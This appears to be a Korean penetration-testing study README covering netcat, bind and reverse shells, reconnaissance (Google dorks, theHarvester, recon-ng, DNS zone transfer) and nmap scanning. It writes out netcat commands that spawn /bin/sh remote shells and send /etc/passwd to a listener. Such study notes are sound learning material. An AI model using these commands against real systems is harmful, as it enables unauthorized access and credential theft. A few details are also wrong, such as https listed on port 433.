# whitehacker
모의해킹 공부 리포 입니다

## 넷캣 (해킹의 맥가이버 역할)

1) nc -h : 기본옵션확인

2) nc -lvp 4444
l : 리스닝모드 서버로 동작
v: vervus 상태메세지 출력
p : 리스닝시 포트번호 설정

3) nc [로컬ip -> 클라이언트or공격대상?] [공격대상포트번호] : 공격대상에 접속

4) cat /etc/passwd : passwd파일 보기
passwd파일 : 사용자 정보 담겨있음


### “<“ , “>” 꺽새표시의 의미

-nc -lvp 4444 > passwd
4444로 들어오는 정보를 passwd로 전달

-nc -q 0 [로컬ip] [공격대상포트번호] < /etc/passwd
passwd파일의 정보를 클라이언트쪽으로 보내줌\
q : 한번실행하고 명령종료 (여기선 파일 보내고 종료)


## 원격으로 커맨드쉘 생성 (바인드쉘 vs 리버스쉘)
-둘이 나뉘는 이유 : “방화벽”
방화벽은 최전방에서 들어오는 접속을 막지만, 내부에서 외부로 나가는 접속을 막지는 않음. 그래서 리버스쉘을 사용한다.

-공통 : 둘다 공격대상의 쉘에서 -e /bin/sh 입력함

* 바인드쉘 : 타겟 쪽에 서버포트가 열리고 해커쪽에서 타겟으로 접속하여 생성시키는 쉘

(공격대상에서)
1. nc -lvp 4444 -e  /bin/sh
e : 접속이 되고나면 실행할 명령 입력

(우리쪽)

2. nc [로컬ip주소] [포트번호]
하고나면 공격대상 쉘에 접속

* 리버스쉘 : 우리쪽에서 포트를 열고 타겟쪽에서 우리쪽으로 접속시킴
리스닝은 우리쪽에서 하지만 결국엔 우리쪽에서 명령어 입력가능

(우리쪽)
1. nc -lvp [포트번호]

(공격대상)

2. nc [로컬ip] [포트번호] -e /bin/sh\

* sh 명령어
1. id : 사용자 계정정보 확인
2. ip addr : ip주소 확인
3. cat /etc/passwd : 사용자 정보 확인


## 패시브 스캐닝

패시브 스캐닝 : 이미 공개되어 있는 정보 알아냄


-구글 해킹 키워드 정리
* site [사이트주소] : 그 사이트에 대한 정보만 나옴\
추가로 -site [사이트주소] 이 사이트에 대한 정보 만 없음\
추가로 filetype pdf
* inurl:admin : 관리자페이지가 어느사이트 내에 존재하는 지 알수잇음
* intitle: “index of” 취약한 사이트의 디렉토리와 파일들이 의도치않게 공개되는 경우가 있음 그때 웹문서상의 제목이 index of가 됨\
추가로 pdf 붙이면 그 확장자의 파일들 검색 가능
* 추가로 명령어 조사해보기
* exploit-db.com 에서도 google hacking database 볼수있음


-netcraft 사이트 searchdns.netcraft.com
인터넷상의 운용되는 웹서버들에 대한 정보 수집
(언제부터, 서버의 버전 등등)
* [사이트주소] 검색하면 각 서브 도메인 정보얻을 수 있음

-whois 사이트 whois.kisa.or.kr/kor/main.jsp
도메인을 등록할 때의 주소나 담당자 등 정보수집
* [사이트주소 or ip주소]

-이메일 수집
공격대상의 이메일 주소를 알아내기
* 터미널에 theharvester -d [검색할 도메인 이름] -b [사용할 검색엔진]
그 도메인을 사용하는 메일들이나 서브 메일, ip주소까지 확인가능


-Recon-ng
* 터미널에 recon-ng 입력
help : 각종 명령어 나옴\
search : 모듈 위치 확인\
use [실행할 모듈 (위치포함)]

* 모듈
whois_pocs : whois 서버에 공개되어있는 정보확인
bing_domain_web 도메인정보 host

* 모듈 안에서 명령어\
show option : 어떤 거 설정해야 될지\
show info\
set SOURCE [바꿀소스(도메인)] : 소스바꿈\
run : 모듈 실행\
control + c : 종료\
show contacts : 수집한 이메일, 각종 정보 출력 (whois_pocs)
show hosts (bing_domain_web)


## 액티브 스캐닝
### DNS정보수집
ip주소, 서버정보 등 얻을 수 있음

DNS : 도메인 이름을 ip주소로 변경하기 위해 사용하는 것

실습도메인 : zonetransfer.me

명령어 
* host zonetransfer.me : dns정보 알아냄, ip주소 알아냄
* nslookup zonetransfer.me : ip주소 알아냄

네임서버 : dns요청을 처리하는 서버
네임서버는 사이트의 서브도메인과 ip주소를 가지고있다

명령어
* host -t ns zonetransfer.me : 네임서버 알아내기

네임서버 알고나면 zonetransfer 공격 사용가능
zonetransfer : dns서버들끼리 자신들의 데이터베이스를 복사해주어 서로 정보를 공유하기 위해 사용하는 것

명령어
* host -l zonetransfer.me [네임서버이름] : 서브도메인들과 ip주소들을 알 수 있음
(zonetransfer.me 아직 이해 부족)


### 더 쉬운 버전 dnsenum
명령어
* dnsenum -h
* dnsenum zonetransfer.me

### 호스트검색

외부에서 수행할때 호스트 하나에 침투성공하면 연결된 다른 호스트로도 접근가능

명령어
* ping [ip주소] : 호스트가 살아있는지 확인
* fping -g [ip주소] : ip주소 쪽 전체로 핑 보냄
* fping -q -a -g [ip주소] : q(한번실행) a(살아있는핑만)
* nmap -sn [ip주소] : 살아있는 호스트 나옴

### 포트스캐닝
공격대상 호스트에 어떤 포트가 열려있는지, 어떤 서비스가 있는지 확인

주요사용포트는 암묵적으로 정해져있음
http : 80
https : 433
ftp : 21
ssh : 22

* vi etc/services : 서비스, 포트번호 어떻게 설정되어있는지 확인가능

포트가 열려있다 : 포트를 통해 서비스가 운영되고있다.

* nmap [ip주소] : 어느포트가 열려있는지
* nmap -sT
* (root권한일때) namp -sS
* namp -sU : udp스캐닝(느림)
* nmap -sU [ip주소] -p [포트번호]-[포트번호] : 포트번호 범위 지정
* nmap -O [ip주소] : 운영체제확인
* nmap -sV : 버전정보
* nmap -A [ip주소] : 버전정보 + 운영체제확인

nmap 스크립팅 엔진 : 특정서비스를 공격하는 스크립트를 실행하여 취약점과 익스플로잇 가능여부 파악가능
* ls -al /usr/share/nmap/scripts/  : 스크립트위치
* ls -al /usr/share/nmap/scripts/ftp- : ftp관련 스크립트만
* nmap [ip주소] -p 21 - -script=ftp-vsftpd-backdoor : 우리 스크립트에 백도어가 있는지 검사

